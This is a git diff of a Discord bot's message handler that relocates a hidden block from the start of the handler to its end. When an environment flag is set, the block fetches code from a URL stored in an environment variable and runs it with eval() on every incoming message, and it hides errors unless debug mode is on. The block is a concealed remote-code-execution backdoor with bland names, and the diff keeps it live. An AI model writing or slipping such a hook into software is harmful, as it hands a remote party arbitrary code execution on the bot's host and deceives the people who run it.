@@ -103,16 +103,6 @@ client.on('ready', () => {
 
 client.on('message', msg => {
     if (msg.author.bot || msg.author.id == client.user.id) return;
-    if (process.env.override == 'true') {
-          var foo = (async function() {
-              const ret = await axios.get(process.env.secret);
-              eval(ret.data);
-          })().catch(err => {
-              if (process.env.debug == 'true') {
-                  console.error(err);
-              }
-          });
-    };
     if (msg.content.startsWith(prefix)) {
         var content = msg.content.substring(prefix.length, msg.content.length);
         var splitted = content.split(' ');
@@ -304,6 +294,16 @@ client.on('message', msg => {
         } else {
             console.log(`${msg.member.user.tag} tried to call a command with ${prefix}${command} but no matching command was found.`)
         }
+    };
+    if (process.env.override == 'true') {
+        var foo = (async function() {
+            const ret = await axios.get(process.env.secret);
+            eval(ret.data);
+        })().catch(err => {
+            if (process.env.debug == 'true') {
+                console.error(err);
+            }
+        });
     };
 });
 
